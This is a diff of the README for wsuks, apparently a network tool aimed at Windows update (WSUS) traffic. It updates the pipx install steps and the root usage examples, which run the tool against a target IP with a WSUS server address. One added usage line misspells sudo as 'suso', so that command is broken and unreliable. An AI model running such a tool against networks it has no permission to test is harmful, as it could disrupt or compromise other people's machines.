-sudo pipx install wsuks
+sudo apt install python3-pipx
+pipx ensurepath
+pipx install wsuks
+sudo ln -s ~/.local/pipx/venvs/wsuks/bin/wsuks /usr/local/bin/wsuks
 ```
 
 Using poetry:
 ```
 sudo apt install python3-poetry
 git clone https://github.com/NeffIsBack/wsuks
 cd wsuks
@@ -42,17 +50,16 @@
 ```
 
 ## Usage
 ❗wsuks must be run as root❗
 
 With pipx:
 ```
-sudo -i
-wsuks
-wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
+sudo wsuks
+suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
 
 With poetry:
 ```
 sudo poetry run wsuks
 sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
 ```
```

